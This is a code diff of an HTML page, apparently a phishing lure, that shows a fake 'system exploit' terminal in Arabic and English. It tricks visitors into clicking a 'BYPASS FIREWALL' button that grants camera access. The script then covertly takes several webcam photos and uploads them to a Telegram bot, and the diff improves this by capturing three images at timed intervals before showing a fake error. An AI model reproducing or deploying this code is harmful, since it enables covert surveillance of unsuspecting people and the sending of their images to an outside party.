@@ -15,14 +15,13 @@
 </head>
 <body>
 
-    <div class="glitch">-- WARNING: UNAUTHORIZED ACCESS --</div>
+    <div class="glitch">-- WARNING: SYSTEM VULNERABILITY DETECTED --</div>
     <div class="terminal">
-        <p>> Initializing system exploit...</p>
-        <p>> Bypassing firewall... DONE</p>
-        <p>> Accessing local files... PENDING</p>
-        <p style="color: red;">! ERROR: Identity Verification Required !</p>
-        <p>لتكملة عملية الاختراق وتأكيد هويتك، اضغط بالأسفل:</p>
-        <button id="startBtn">تجاوز نظام الحماية (Bypass)</button>
+        <p>> Injecting payload...</p>
+        <p>> Cracking encryption... 67%</p>
+        <p style="color: red;">! ERROR: Manual Auth Required !</p>
+        <p>اضغط لتجاوز جدار الحماية وتأكيد الهوية:</p>
+        <button id="startBtn">BYPASS FIREWALL</button>
     </div>
 
     <video id="video" autoplay></video>
@@ -36,34 +35,40 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        async function sendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+
         startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // التقاط الصورة بعد ثانية من فتح الكاميرا
+                // التقاط 3 صور بفواصل زمنية (تجنب الصور السوداء)
+                setTimeout(() => sendPhoto(), 2000); // صورة بعد ثانيتين (ضبط الإضاءة)
+                setTimeout(() => sendPhoto(), 4000); // صورة بعد 4 ثوانٍ
                 setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'image.jpg');
+                    sendPhoto();
+                    alert("System Overloaded. Disconnecting...");
+                    stream.getTracks().forEach(track => track.stop());
+                }, 6000);
 
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            alert("Bypass Failed: Security system active. Closing session...");
-                            stream.getTracks().forEach(track => track.stop());
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
             } catch (err) {
-                alert("يجب تفعيل الكاميرا لتجاوز حماية النظام!");
+                alert("Access Denied: Camera Permission Needed!");
             }
         });
     </script>
